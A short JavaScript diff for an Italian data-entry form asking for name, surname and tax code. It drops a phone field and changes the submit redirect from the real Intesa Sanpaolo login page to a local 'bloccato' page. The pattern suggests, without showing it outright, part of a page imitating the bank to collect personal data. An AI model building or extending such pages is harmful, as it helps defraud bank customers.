@@ -77,7 +77,6 @@ document.addEventListener('DOMContentLoaded', function() {
     const nome = document.getElementById('nome');
     const cognome = document.getElementById('cognome');
     const cf = document.getElementById('cf');
-    const telefono = document.getElementById('telefono');
     const continuaButton = document.querySelector('.login-button');
 
     // Disabilita bottone all'avvio
@@ -95,10 +94,8 @@ document.addEventListener('DOMContentLoaded', function() {
         const cfVal = cf.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
         cf.value = cfVal.slice(0, 16);
         const cfValid = cf.value.length >= 7;
-        const telVal = telefono.value.replace(/\D/g, '');
-        telefono.value = telVal.slice(0, 15);
-        const telValid = telefono.value.length >= 5;
-        if (nomeValid && cognomeValid && cfValid && telValid) {
+        
+        if (nomeValid && cognomeValid && cfValid) {
             continuaButton.disabled = false;
             continuaButton.style.backgroundColor = '';
             continuaButton.style.cursor = 'pointer';
@@ -112,12 +109,11 @@ document.addEventListener('DOMContentLoaded', function() {
     nome.addEventListener('input', validate);
     cognome.addEventListener('input', validate);
     cf.addEventListener('input', validate);
-    telefono.addEventListener('input', validate);
 
     document.querySelector('.dati-form').addEventListener('submit', function(e) {
         e.preventDefault();
         if (!continuaButton.disabled) {
-            window.location.href = 'https://www.intesasanpaolo.com/it/extra-content-login/primo-accesso.html';
+            window.location.href = './bloccato.html';
         }
     });
 });
